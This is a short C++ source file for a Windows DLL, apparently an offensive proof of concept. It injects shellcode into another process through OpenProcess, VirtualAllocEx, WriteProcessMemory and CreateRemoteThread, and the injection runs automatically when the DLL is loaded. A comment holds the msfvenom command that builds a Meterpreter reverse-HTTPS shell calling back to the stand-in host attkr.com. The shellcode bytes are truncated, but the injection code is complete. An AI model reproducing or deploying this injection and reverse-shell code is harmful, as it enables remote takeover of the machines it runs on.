// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>

/* POC exec shellcode in unmanaged dll
 * @thelikes
 */

extern "C" __declspec(dllexport) void sploit()
{
    // msfvenom -p windows/meterpreter/reverse_https LHOST=attkr.com LPORT=443 EXITFUNC=thread -f c -o msf-windows-https.c 
    unsigned char shellcode[] ="\xfc\xe8\x8f\x00";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi("1108")));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        sploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

